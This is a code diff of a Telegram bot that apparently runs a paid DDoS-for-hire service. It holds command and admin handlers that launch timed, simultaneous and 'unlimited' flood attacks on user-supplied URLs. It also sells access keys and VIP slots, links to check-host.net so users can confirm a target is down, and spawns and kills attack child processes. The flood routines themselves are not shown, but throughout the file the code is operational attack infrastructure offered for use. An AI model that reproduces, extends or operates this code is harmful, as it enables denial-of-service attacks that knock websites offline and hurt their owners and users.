-      await this.bot.sendMessage(chatId, `❌ Error starting unlimited attack: ${err.message}`);
-    }
-  }
-
-  async handleMultiAttack(userId, chatId, url, time, methodsInput) {
-    const methods = methodsInput.split(',').map(m => m.trim().toLowerCase());
-    const required = methods.length;
-    if (!this.attackManager.canRunSimultaneous(userId, required)) {
-      const available = this.attackManager.getMaxSlots(userId) - this.attackManager.getUserSlots(userId).length;
-      return this.bot.sendMessage(chatId, `❌ Custom attack requires ${required} slots. You have ${available} available.`);
-    }
-    if (!this.attackManager.canUserAttack(userId)) {
-      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
-        return this.bot.sendMessage(chatId, `❌ Key required for custom attacks!`);
-      }
-      const remaining = this.attackManager.getRemainingCooldown(userId);
-      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before custom attack.`);
-    }
-    const error = MessageFormatter.validateInputs(url, 443, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
-    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);
-
-    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
-    if (invalid.length) return this.bot.sendMessage(chatId, `❌ Invalid methods: ${invalid.join(', ')}`);
-    if (methods.length > this.config.simultaneousAttacks.maxConcurrent) {
-      return this.bot.sendMessage(chatId, `❌ Maximum ${this.config.simultaneousAttacks.maxConcurrent} methods allowed`);
-    }
-
-    this.attackManager.setUserRunning(userId);
-    try {
-      const details = MessageFormatter.simultaneousAttackDetails(url, time, methods);
-      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
-      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
-      await this.bot.sendMessage(chatId, ` CUSTOM Attack\n${methods.length} attacks running!\nCheck: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
-      const result = await this.attackExecutor.runCustomSimultaneousAttack(url, time, methods, userId, chatId);
-      this.attackManager.setUserCooldown(userId, this.config.simultaneousAttacks.cooldownMultiplier);
-      this.dataManager.incrementSimultaneousCount(userId);
-      this.dataManager.incrementAttackCount(userId, methods.length);
-      let msg = `✅ Custom attack completed! ${methods.length} attacks finished.`;
-      if (result.failed) msg += ` (${result.failed} failed)`;
-      msg += `\nCooldown: ${this.config.cooldownTime * this.config.simultaneousAttacks.cooldownMultiplier} seconds`;
-      await this.bot.sendMessage(chatId, msg);
-    } catch (err) {
-      this.attackManager.clearUserStatus(userId);
-      console.error(`❌ Custom attack error for user ${userId}:`, err);
-      await this.bot.sendMessage(chatId, `❌ Error during custom simultaneous attack: ${err.message}`);
-    }
-  }
-}
-
-// ==================== Admin Command Handler ====================
-class AdminCommandHandler {
-  constructor(bot, config, dataManager, attackManager, unlimitedManager, userAttackSlots, activeAttacks) {
-    this.bot = bot;
-    this.config = config;
-    this.dataManager = dataManager;
-    this.attackManager = attackManager;
-    this.unlimitedManager = unlimitedManager;
-    this.userAttackSlots = userAttackSlots;
-    this.activeAttacks = activeAttacks;
-  }
-
-  async handle(chatId, userId, inputs) {
-    if (userId !== this.config.adminId) {
-      return this.bot.sendMessage(chatId, "❌ Access denied. Admin only.");
-    }
-    const command = inputs[1]?.toLowerCase() || 'help';
-    switch (command) {
-      case 'status': return this.status(chatId);
-      case 'users': return this.users(chatId);
-      case 'methods': return this.bot.sendMessage(chatId, MessageFormatter.methodsList(), { parse_mode: 'Markdown' });
-      case 'stop': return this.stopAll(chatId);
-      case 'broadcast': return this.broadcast(chatId, inputs.slice(2).join(' '));
-      case 'cooldown': return this.setCooldown(chatId, inputs[2]);
-      case 'clearlogs': return this.clearLogs(chatId);
-      case 'delkey': return this.delKey(chatId, inputs[2]);
-      case 'disablekey': return this.disableKey(chatId, inputs[2]);
-      case 'enablekey': return this.enableKey(chatId, inputs[2]);
-      case 'keys': return this.listKeys(chatId);
-      case 'addkey': return this.addKey(chatId, inputs[2], inputs[3]);
-      case 'slots': return this.userSlots(chatId, inputs[2]);
-      case 'setvip': return this.setVip(chatId, inputs[2]);
-      case 'showvip': return this.bot.sendMessage(chatId, `🎯 Current VIP methods: ${this.config.vipMethods.join(', ').toUpperCase()}`);
-      case 'setsimul': return this.setSimul(chatId, inputs[2]);
-      case 'showsimul': return this.bot.sendMessage(chatId, `💥 Current SIMULTANEOUS methods: ${this.config.simulMethods.join(', ').toUpperCase()}`);
-      case 'setconcurrent': return this.setConcurrent(chatId, inputs[2]);
-      case 'showconcurrent': return this.bot.sendMessage(chatId, `🔄 Current max concurrent attacks: ${this.config.simultaneousAttacks.maxConcurrent}`);
-      case 'help':
-      default: return this.showHelp(chatId);
-    }
-  }
-
-  async status(chatId) {
-    const active = this.activeAttacks.size;
-    const unlimited = Array.from(this.unlimitedManager.unlimitedAttacks.values()).filter(a => a.active).length;
-    const totalUsers = Object.keys(this.dataManager.users).length;
-    await this.bot.sendMessage(chatId,
-      ` *Bot Status*\n\n` +
-      ` Bot is running properly\n` +
-      ` Active attacks: ${active}\n` +
-      ` Unlimited attacks: ${unlimited}\n` +
-      ` Total users: ${totalUsers}\n` +
-      ` Cooldown time: ${this.config.cooldownTime} seconds\n` +
-      ` Max slots (user/admin): ${this.config.maxSlots}/${this.config.adminMaxSlots}\n` +
-      ` VIP Methods: ${this.config.vipMethods.join(', ')}\n` +
-      ` SIMUL Methods: ${this.config.simulMethods.join(', ')}\n` +
-      ` Max Concurrent: ${this.config.simultaneousAttacks.maxConcurrent}\n` +
-      ` Total Methods: ${this.config.validMethods.length}\n` +
-      ` Server time: ${moment().format('YYYY-MM-DD HH:mm:ss')}`
+  // If no ID provided, show usage
+  if (!match[1]) {
+    return bot.sendMessage(
+      chatId,
+      `❌ *Usage:* /stop <attack_id>\n\nView active attacks with /list`,
+      { parse_mode: 'Markdown' }
     );
   }
 
-  async users(chatId) {
-    let list = " *Active Users:*\n";
-    this.userAttackSlots.forEach((slots, uid) => {
-      const username = this.dataManager.users[uid]?.username || `User_${uid}`;
-      const unlimited = this.unlimitedManager.hasForUser(uid) ? ' ♾️' : '';
-      list += `• ${username} (${uid}) - Active attacks: ${slots.length}${unlimited}\n`;
-    });
-    await this.bot.sendMessage(chatId, list || "No active users");
+  const attackId = parseInt(match[1]);
+  if (isNaN(attackId)) {
+    return bot.sendMessage(
+      chatId,
+      `❌ *Invalid attack ID*\nMust be a number.`,
+      { parse_mode: 'Markdown' }
+    );
   }
 
-  async stopAll(chatId) {
-    const stopped = await this.attackManager.stopAllAttacks(this.bot);
-    // Also stop unlimited
-    let unlimitedStopped = 0;
-    for (const [attackId, attack] of this.unlimitedManager.unlimitedAttacks.entries()) {
-      if (attack.active) {
-        attack.active = false;
-        this.unlimitedManager.unlimitedAttacks.delete(attackId);
-        unlimitedStopped++;
-      }
-    }
-    await this.bot.sendMessage(chatId, ` Stopped ${stopped + unlimitedStopped} active attacks`);
+  console.log(`[STOP] Looking for attack ID ${attackId}, current active:`, Array.from(activeAttacks.keys()));
+
+  const attack = activeAttacks.get(attackId);
+  if (!attack) {
+    return bot.sendMessage(
+      chatId,
+      `❌ *Attack not found*\nNo active attack with ID \`${attackId}\`.\nUse /list to see active attacks.`,
+      { parse_mode: 'Markdown' }
+    );
   }
 
-  async broadcast(chatId, message) {
-    if (!message) return this.bot.sendMessage(chatId, "Usage: /admin broadcast <message>");
-    let sent = 0, errors = 0;
-    for (const [uid, data] of Object.entries(this.dataManager.users)) {
-      try {
-        await this.bot.sendMessage(data.chatId, ` *Admin Broadcast:*\n${message}`, { parse_mode: 'Markdown' });
-        sent++;
-      } catch { errors++; }
-    }
-    await this.bot.sendMessage(chatId, ` Broadcast sent to ${sent} users. Failed: ${errors}`);
-  }
-
-  async setCooldown(chatId, seconds) {
-    const val = parseInt(seconds);
-    if (isNaN(val) || val < 0) return this.bot.sendMessage(chatId, "Cooldown must be a positive number");
-    this.config.cooldownTime = val;
-    await this.bot.sendMessage(chatId, ` Cooldown time set to ${val} seconds`);
-  }
-
-  async clearLogs(chatId) {
-    this.activeAttacks.clear();
-    this.userAttackSlots.clear();
-    this.userAttackStatus.clear();
-    this.unlimitedManager.unlimitedAttacks.clear();
-    await this.bot.sendMessage(chatId, " Cleared all active attacks and user status");
-  }
-
-  async delKey(chatId, key) {
-    if (!key) return this.bot.sendMessage(chatId, "Usage: /admin delkey <key>");
-    const k = key.toUpperCase();
-    if (this.dataManager.keys[k]) {
-      delete this.dataManager.keys[k];
-      await this.dataManager.saveKeys();
-      await this.bot.sendMessage(chatId, `✅ Key ${k} has been deleted`);
-    } else {
-      await this.bot.sendMessage(chatId, `❌ Key ${k} not found`);
-    }
-  }
-
-  async disableKey(chatId, key) {
-    if (!key) return this.bot.sendMessage(chatId, "Usage: /admin disablekey <key>");
-    const k = key.toUpperCase();
-    if (this.dataManager.keys[k]) {
-      this.dataManager.keys[k].enabled = false;
-      await this.dataManager.saveKeys();
-      await this.bot.sendMessage(chatId, `✅ Key ${k} has been disabled`);
-    } else {
-      await this.bot.sendMessage(chatId, `❌ Key ${k} not found`);
-    }
-  }
-
-  async enableKey(chatId, key) {
-    if (!key) return this.bot.sendMessage(chatId, "Usage: /admin enablekey <key>");
-    const k = key.toUpperCase();
-    if (this.dataManager.keys[k]) {
-      this.dataManager.keys[k].enabled = true;
-      await this.dataManager.saveKeys();
-      await this.bot.sendMessage(chatId, `✅ Key ${k} has been enabled`);
-    } else {
-      await this.bot.sendMessage(chatId, `❌ Key ${k} not found`);
-    }
-  }
-
-  async listKeys(chatId) {
-    await this.bot.sendMessage(chatId, MessageFormatter.formatKeysList(this.dataManager.keys), { parse_mode: 'Markdown' });
-  }
-
-  async addKey(chatId, type, key) {
-    if (!type || !key) return this.bot.sendMessage(chatId, "Usage: /admin addkey <type> <key>");
-    const k = key.toUpperCase();
-    if (this.dataManager.keys[k]) return this.bot.sendMessage(chatId, `❌ Key ${k} already exists`);
-    this.dataManager.keys[k] = { type: type.toUpperCase(), enabled: true, usedBy: [], createdAt: new Date().toISOString() };
-    await this.dataManager.saveKeys();
-    await this.bot.sendMessage(chatId, `✅ Key added successfully!\n\nKey: ${k}\nType: ${type.toUpperCase()}\nStatus: ✅ Enabled`);
-  }
-
-  async userSlots(chatId, userIdStr) {
-    const userId = parseInt(userIdStr);
-    if (isNaN(userId)) return this.bot.sendMessage(chatId, "Invalid user ID");
-    const slots = this.userAttackSlots.get(userId) || [];
-    const max = this.attackManager.getMaxSlots(userId);
-    const username = this.dataManager.users[userId]?.username || `User_${userId}`;
-    const unlimited = this.unlimitedManager.hasForUser(userId);
-    let msg = `🎯 *Slots for ${username}*\n\nUsed: ${slots.length}/${max}\nUnlimited: ${unlimited ? '✅' : '❌'}\n\n`;
-    if (slots.length) {
-      msg += `*Active Attacks:*\n`;
-      slots.forEach((aid, i) => {
-        const attack = this.activeAttacks.get(aid);
-        if (attack) {
-          msg += `${i+1}. ${attack.method} on ${attack.target}\n`;
-        }
-      });
-    } else {
-      msg += 'No active attacks.';
-    }
-    await this.bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
-  }
-
-  async setVip(chatId, methodsStr) {
-    if (!methodsStr) return this.bot.sendMessage(chatId, "Usage: /admin setvip <method1,method2,...>");
-    const methods = methodsStr.split(',').map(m => m.trim().toLowerCase());
-    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
-    if (invalid.length) return this.bot.sendMessage(chatId, `❌ Invalid VIP methods: ${invalid.join(', ')}`);
-    this.config.vipMethods = methods;
-    await this.config.save();
-    await this.bot.sendMessage(chatId, `✅ VIP methods updated and saved: ${methods.join(', ').toUpperCase()}`);
-  }
-
-  async setSimul(chatId, methodsStr) {
-    if (!methodsStr) return this.bot.sendMessage(chatId, "Usage: /admin setsimul <method1,method2,...>");
-    const methods = methodsStr.split(',').map(m => m.trim().toLowerCase());
-    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
-    if (invalid.length) return this.bot.sendMessage(chatId, `❌ Invalid SIMULTANEOUS methods: ${invalid.join(', ')}`);
-    this.config.simulMethods = methods;
-    await this.config.save();
-    await this.bot.sendMessage(chatId, `✅ SIMULTANEOUS methods updated and saved: ${methods.join(', ').toUpperCase()}`);
-  }
-
-  async setConcurrent(chatId, numStr) {
-    const num = parseInt(numStr);
-    if (isNaN(num) || num < 1 || num > 10) return this.bot.sendMessage(chatId, "Max concurrent must be a number between 1 and 10");
-    this.config.simultaneousAttacks.maxConcurrent = num;
-    await this.config.save();
-    await this.bot.sendMessage(chatId, `✅ Max concurrent attacks set to ${num}`);
-  }
-
-  async showHelp(chatId) {
-    await this.bot.sendMessage(chatId, `
-👑 *ADMIN COMMANDS*
-
-📊 *Monitoring:*
-• /admin status - Check bot status and statistics
-• /admin users - List all active users and their status
-• /admin slots <userId> - Check slots for a specific user
-
-⚡ *Attack Management:*
-• /admin methods - View all attack methods
-• /admin stop - Stop all active attacks immediately
-• /admin cooldown <seconds> - Set global cooldown time
-
-🎯 *VIP Methods Control:*
-• /admin setvip <methods> - Set VIP attack methods (comma separated)
-• /admin showvip - Show current VIP methods
-
-💥 *SIMULTANEOUS Methods Control:*
-• /admin setsimul <methods> - Set SIMULTANEOUS attack methods
-• /admin showsimul - Show current SIMULTANEOUS methods
-
-🔄 *Concurrent Attacks Control:*
-• /admin setconcurrent <number> - Set max concurrent attacks (1-10)
-• /admin showconcurrent - Show current max concurrent setting
-
-🔑 *Key Management:*
-• /admin addkey <type> <key> - Add a new key
-• /admin delkey <key> - Delete a key
-• /admin disablekey <key> - Disable a key temporarily
-• /admin enablekey <key> - Enable a key
-• /admin keys - List all keys
-
-📢 *Administration:*
-• /admin broadcast <message> - Broadcast message to all users
-• /admin clearlogs - Clear all active attacks and user status
-
-🆘 *Help:*
-• /admin help - Show this help message
-
-*Usage:* /admin <command> [parameters]
-*Examples:*
-/admin setvip zaher,zaherh2,cfzaher
-/admin setsimul zaher,zaherh2,cfzaher
-/admin addkey VIP MYVIPKEY123
-/admin setconcurrent 5
-    `, { parse_mode: 'Markdown' });
-  }
-}
-
-// ==================== Main Bot ====================
-const config = new Config();
-const dataManager = new DataManager(config);
-const activeAttacks = new Map();
-const userAttackSlots = new Map();
-const userAttackStatus = new Map();
-const unlimitedAttacks = new Map();
-
-const attackExecutor = new AttackExecutor(config, dataManager, activeAttacks, userAttackSlots);
-const attackManager = new AttackManager(config, dataManager, activeAttacks, userAttackSlots, userAttackStatus);
-const unlimitedManager = new UnlimitedAttackManager(attackExecutor, unlimitedAttacks);
-
-let bot;
-try {
-  bot = new TelegramBot(config.botToken, { polling: config.pollingOptions });
-  console.log('🤖 Bot initialized with polling...');
-} catch (error) {
-  console.error('❌ Failed to initialize bot:', error);
-  process.exit(1);
-}
-
-const commandHandler = new CommandHandler(bot, config, dataManager, attackManager, attackExecutor, unlimitedManager, userAttackSlots, activeAttacks);
-const adminHandler = new AdminCommandHandler(bot, config, dataManager, attackManager, unlimitedManager, userAttackSlots, activeAttacks);
-
-// Error handlers
-bot.on('polling_error', (error) => console.error('Polling error:', error));
-bot.on('error', (error) => console.error('Bot error:', error));
-
-// Message handler
-bot.on('message', async (msg) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-  const text = msg.text?.trim();
-  if (!text) return;
-
-  dataManager.recordUserActivity(userId, msg.from.username, chatId);
-  const inputs = text.split(/\s+/);
-  const command = inputs[0].toLowerCase();
-
+  // Kill the child process
   try {
-    if (command === '/admin') {
-      await adminHandler.handle(chatId, userId, inputs);
-      return;
-    }
-
-    switch (command) {
-      case '/start': await commandHandler.handleStart(msg); break;
-      case '/help': await commandHandler.handleHelp(chatId); break;
-      case '/methods': await commandHandler.handleMethods(chatId); break;
-      case '/status': await commandHandler.handleStatus(chatId, userId); break;
-      case '/owner': await commandHandler.handleOwner(chatId); break;
-      case '/stop': await commandHandler.handleStop(chatId, userId); break;
-      case '/key': await commandHandler.handleKey(chatId, userId, inputs); break;
-      case '/mykey': await commandHandler.handleMyKey(chatId, userId); break;
-      case '/slots': await commandHandler.handleSlots(chatId, userId); break;
-      case '/vip':
-        if (inputs.length < 3) return bot.sendMessage(chatId, "❌ Wrong command!\nUse: /vip <url> <time>\nEx: /vip https://example.com 60");
-        await commandHandler.handleVipAttack(userId, chatId, inputs[1], inputs[2]);
-        break;
-      case '/simul':
-        if (inputs.length < 3) return bot.sendMessage(chatId, "❌ Wrong command!\nUse: /simul <url> <time>\nOr: /simul Unlimited <url>");
-        if (inputs[1].toLowerCase() === 'unlimited') {
-          await commandHandler.handleUnlimitedAttack(userId, chatId, inputs[2]);
-        } else {
-          await commandHandler.handleSimultaneousAttack(userId, chatId, inputs[1], inputs[2]);
-        }
-        break;
-      case '/multi':
-        if (inputs.length < 4) return bot.sendMessage(chatId, "❌ Wrong command!\nUse: /multi <url> <time> <methods>");
-        await commandHandler.handleMultiAttack(userId, chatId, inputs[1], inputs[2], inputs[3]);
-        break;
-      default:
-        if (config.validMethods.includes(command.replace('/', '').toLowerCase())) {
-          if (inputs.length < 4) return bot.sendMessage(chatId, MessageFormatter.errorMessage(), { parse_mode: 'Markdown' });
-          await commandHandler.handleAttack(userId, chatId, command.replace('/', ''), inputs[1], inputs[2], inputs[3]);
-        }
+    if (attack.child && typeof attack.child.kill === 'function') {
+      attack.child.kill();
+      console.log(`[STOP] Killed child process for attack ${attackId}`);
+    } else {
+      console.log(`[STOP] No valid child process for attack ${attackId}, removing from map`);
     }
   } catch (err) {
-    console.error('Error handling message:', err);
-    await bot.sendMessage(chatId, '❌ An error occurred while processing your request.');
+    console.error(`[STOP] Error killing attack ${attackId}:`, err);
+    // Still remove from map even if kill fails
   }
+
+  const duration = Math.round((Date.now() - attack.startTime) / 1000);
+  activeAttacks.delete(attackId);
+
+  bot.sendMessage(
+    chatId,
+    `🛑 *Attack stopped*\n` +
+    `ID: \`${attackId}\`\n` +
+    `Target: ${attack.target}\n` +
+    `Duration: ${duration}s`,
+    { parse_mode: 'Markdown' }
+  );
 });
 
-// Initialize data
-(async () => {
-  await dataManager.loadUsers();
-  await dataManager.loadKeys();
-  await config.load();
-  console.log('🤖 Bot is running with enhanced simultaneous attacks...');
-  console.log('🆕 Methods: zaher, zaherH2, CFZAHER');
-  console.log('⚙️ Configuration persistence enabled');
-  console.log('♾️ Unlimited attack mode available');
-})();
+// ---------- STOP ALL ATTACKS ----------
+bot.onText(/\/stopall/, (msg) => {
+  if (!ensureAuthorized(msg)) return;
+  const chatId = msg.chat.id;
 
+  if (activeAttacks.size === 0) {
+    return bot.sendMessage(chatId, '📭 *No active attacks to stop*', { parse_mode: 'Markdown' });
+  }
+
+  const count = activeAttacks.size;
+  for (const [id, attack] of activeAttacks) {
+    attack.child.kill();
+  }
+  activeAttacks.clear();
+
+  bot.sendMessage(chatId, `🛑 *Stopped all ${count} active attacks*`, { parse_mode: 'Markdown' });
+});
+
+// ---------- KEY MANAGEMENT (OWNER ONLY) ----------
+bot.onText(/\/genkey(?:\s+(\d+))?/, (msg, match) => {
+  const userId = msg.from.id;
+  if (userId !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ *Owner only*', { parse_mode: 'Markdown' });
+  }
+
+  const hours = parseInt(match[1]);
+  if (!hours || hours <= 0) {
+    return bot.sendMessage(msg.chat.id, '❌ Usage: /genkey <hours>', { parse_mode: 'Markdown' });
+  }
+
+  // Generate a short key: "zaher" + random 6-digit number
+  let key;
+  do {
+    const randomNum = Math.floor(Math.random() * 900000) + 100000; // 100000..999999
+    key = `zaher${randomNum}`;
+  } while (db.keys[key]); // ensure uniqueness
+
+  const expires = Date.now() + hours * 3600000; // hours to milliseconds
+
+  db.keys[key] = expires;
+  saveData();
+
+  bot.sendMessage(msg.chat.id,
+    `✅ *Key generated*\n` +
+    `Key: \`${key}\`\n` +
+    `Expires: ${new Date(expires).toLocaleString()}\n` +
+    `Duration: ${hours} hour(s)`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+bot.onText(/\/activate\s+(\S+)/, (msg, match) => {
+  const userId = msg.from.id;
+  const key = match[1];
+
+  // Check if key exists and not expired
+  const expires = db.keys[key];
+  if (!expires) {
+    return bot.sendMessage(msg.chat.id, '❌ *Invalid key*', { parse_mode: 'Markdown' });
+  }
+  if (expires < Date.now()) {
+    delete db.keys[key];
+    saveData();
+    return bot.sendMessage(msg.chat.id, '❌ *Key expired*', { parse_mode: 'Markdown' });
+  }
+
+  // Activate user
+  db.users[userId] = { expires };
+  delete db.keys[key]; // single‑use
+  saveData();
+
+  bot.sendMessage(msg.chat.id,
+    `✅ *Activation successful!*\n` +
+    `Your access expires on: ${new Date(expires).toLocaleString()}\n` +
+    `You can now use all bot commands.`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// ---------- RESTART COMMAND (OWNER ONLY) ----------
+bot.onText(/\/restart/, (msg) => {
+  const userId = msg.from.id;
+  if (userId !== OWNER_ID) {
+    return bot.sendMessage(msg.chat.id, '⛔ *Owner only*', { parse_mode: 'Markdown' });
+  }
+
+  bot.sendMessage(msg.chat.id, '🔄 *Restarting bot...*', { parse_mode: 'Markdown' })
+    .then(() => {
+      // Kill all active attack child processes
+      for (const [id, attack] of activeAttacks) {
+        attack.child.kill();
+      }
+      // Wait a moment for the message to send, then exit
+      setTimeout(() => process.exit(0), 1000);
+    });
+});
+
+console.log('🤖 Bot is running...');
